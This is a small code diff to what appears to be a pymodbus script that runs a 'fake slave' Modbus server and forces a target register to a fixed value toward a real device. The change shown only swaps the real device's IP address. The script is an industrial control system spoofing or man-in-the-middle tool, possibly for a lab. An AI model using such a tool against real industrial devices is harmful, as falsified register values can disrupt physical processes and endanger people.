@@ -11,7 +11,7 @@ from pymodbus.datastore import (
 LISTEN_IP = "0.0.0.0"
 LISTEN_PORT = 502
 
-REAL_SLAVE_IP = "192.168.70.61"
+REAL_SLAVE_IP = "172.16.4.51"
 REAL_SLAVE_PORT = 502
 
 TARGET_REGISTER = 2
@@ -61,4 +61,3 @@ print(f"[+] Fake slave listening on {LISTEN_IP}:{LISTEN_PORT}")
 print(f"[+] Forwarding register {TARGET_REGISTER} as {FORCED_VALUE} to real slave")
 
 StartTcpServer(context, address=(LISTEN_IP, LISTEN_PORT))
-
